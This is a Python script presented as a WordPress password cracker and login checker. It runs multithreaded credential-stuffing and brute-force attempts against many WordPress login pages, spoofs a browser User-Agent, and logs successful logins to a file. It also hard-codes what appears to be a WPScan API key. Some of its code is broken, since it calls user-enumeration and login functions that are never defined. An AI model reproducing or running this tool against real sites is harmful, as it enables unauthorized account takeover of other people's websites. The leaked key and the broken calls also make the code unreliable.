# WORDPRESS PASSWORD CRACKER AND LOGIN CHECKER V1.0 MADE BY XABIT                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          wp-xabit.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    import os
import requests
import time
from colorama import Fore, Style
from pyfiglet import figlet_format
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue

API_KEY = "IEq9GmbMtcapALpiL9jOow9tz3WRRDjbALxaN1JxVIQ"
API_BASE_URL = "https://wpscan.com/api/v3"
MAX_THREADS = 60  # Limit threads to 60 requests per second

def print_banner():
    banner = f'''
{Fore.RED}
▒██   ██▒    ▄▄▄          ▄▄▄▄       ██▓   ▄▄▄█████▓
▒▒ █ █ ▒░   ▒████▄       ▓█████▄    ▓██▒   ▓  ██▒ ▓▒
░░  █   ░   ▒██  ▀█▄     ▒██▒ ▄██   ▒██▒   ▒ ▓██░ ▒░
 ░ █ █ ▒    ░██▄▄▄▄██    ▒██░█▀     ░██░   ░ ▓██▓ ░
▒██▒ ▒██▒    ▓█   ▓██▒   ░▓█  ▀█▓   ░██░     ▒██▒ ░
▒▒ ░ ░▓ ░    ▒▒   ▓▒█░   ░▒▓███▀▒   ░▓       ▒ ░░
░░   ░▒ ░     ▒   ▒▒ ░   ▒░▒   ░     ▒ ░       ░
 ░    ░       ░   ▒       ░    ░     ▒ ░     ░
 ░    ░           ░  ░    ░          ░
                               ░
{Fore.RESET}

{Fore.YELLOW}THIS TOOL IS MADE BY XABIT v1.0 -- WORDPRESS PASSWORD CRACKER
LETS MAKE THE WORLD SAFER{Fore.RESET}
'''
    print(banner)

def brute_force_site(url, username, password):
    login_url = url
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': url,
        'testcookie': '1'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
    }
    try:
        response = requests.post(login_url, data=login_data, headers=headers)
        if "dashboard" in response.url or "wp-admin" in response.url:
            print(Fore.GREEN + f"[+] Success: Username: {username} | Password: {password} on {url}" + Style.RESET_ALL)
            with open("loginsuccess.txt", "a") as f:
                f.write(f"[+] Success: {url} | Username: {username} | Password: {password}\n")
            return True
        else:
            print(Fore.RED + f"[-] Failed: Username: {username} | Password: {password} on {url}" + Style.RESET_ALL)
    except Exception as e:
        print(f"Error connecting to {url}: {str(e)}")

    return False

def input_sites_and_credentials_from_file(filename):
    credentials = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                line = line.strip()
                if '#' in line:
                    url, credentials_str = line.split('#')
                    if '@' in credentials_str:
                        username, password = credentials_str.split('@')
                        credentials.append((url, username, password))
                    else:
                        print(Fore.RED + f"Invalid format for credentials: {credentials_str}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Invalid format for line: {line}" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + f"File {filename} not found." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error reading file: {str(e)}" + Style.RESET_ALL)

    return credentials

def worker(credentials_queue):
    while not credentials_queue.empty():
        url, username, password = credentials_queue.get()
        brute_force_site(url, username, password)
        credentials_queue.task_done()
        # Ensure that no more than 60 requests are made per second
        time.sleep(1 / MAX_THREADS)

def brute_force_all_sites():
    filename = input("Enter the name of the text file containing sites and credentials: ")
    credentials = input_sites_and_credentials_from_file(filename)

    credentials_queue = Queue()
    for cred in credentials:
        credentials_queue.put(cred)

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for _ in range(MAX_THREADS):
            executor.submit(worker, credentials_queue)

    credentials_queue.join()  # Wait for all threads to finish

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def main_menu():
    clear_screen()
    print_banner()
    print(Fore.YELLOW + "Choose an option:" + Fore.RESET)
    print(Fore.YELLOW + "1. Enumerate users and crack passwords" + Fore.RESET)
    print(Fore.YELLOW + "2. Bruteforce based on file (sites and credentials)" + Fore.RESET)
    print(Fore.YELLOW + "3. Exit" + Fore.RESET)

    option = int(input("Enter your choice (1, 2, or 3): "))

    if option == 1:
        sites_file = input("Enter the name of the text file containing sites: ")
        passwords_file = input("Enter the name of the text file containing passwords: ")
        crack_passwords(sites_file, passwords_file)
    elif option == 2:
        brute_force_all_sites()
    elif option == 3:
        print(Fore.YELLOW + "Exiting..." + Fore.RESET)
        exit()
    else:
        print(Fore.RED + "Invalid choice. Exiting." + Style.RESET_ALL)

    input("Press Enter to continue...")
    main_menu()

def crack_passwords(sites_file, passwords_file):
    try:
        with open(sites_file, 'r') as file:
            sites = [line.strip() for line in file]
        with open(passwords_file, 'r') as file:
            passwords = [line.strip() for line in file]

        for site in sites:
            users = enumerate_users(site)
            print(f"Enumerated users for {site}:")
            for user in users:
                username = user['username']
                print(f"- {username}")
                for password in passwords:
                    if brute_force_login(site, username, password):
                        break
    except FileNotFoundError:
        print(Fore.RED + "File not found." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)

if __name__ == "__main__":
    main_menu()

